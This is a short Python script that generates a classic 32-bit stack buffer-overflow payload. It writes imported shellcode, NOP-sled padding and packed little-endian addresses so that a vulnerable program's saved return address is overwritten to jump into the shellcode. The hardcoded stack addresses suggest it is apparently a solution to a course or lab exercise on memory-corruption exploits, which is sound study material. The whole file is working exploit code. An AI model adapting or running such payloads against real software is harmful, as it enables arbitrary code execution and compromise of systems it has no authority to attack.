#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''shell_code_addr -> (vulnerable return address)'''

VULNERABLE_EBP = 0xfffed298     # vulnerable %ebp
ADDR_DIFF = 0x810               # %ebp - buf start address      (2064-byte)
# shell code start address  (buf start address)
SHELL_CODE_ADDR = VULNERABLE_EBP-ADDR_DIFF
VULNERABLE_FP_SIZE = 0x04       # vulnerable frame pointer size (4-byte)
# return address (vulnerable return address)
RETURN_ADDR = VULNERABLE_EBP+VULNERABLE_FP_SIZE        
BUFFER_SIZE = 0x800             # buf size                      (2048-byte)
SHELL_CODE_SIZE = 0x17          # shell code length in byte     (23-byte)
sys.stdout.buffer.write(shellcode+b'\x90'*(BUFFER_SIZE-SHELL_CODE_SIZE)+pack('<I',SHELL_CODE_ADDR)+pack('<I',RETURN_ADDR))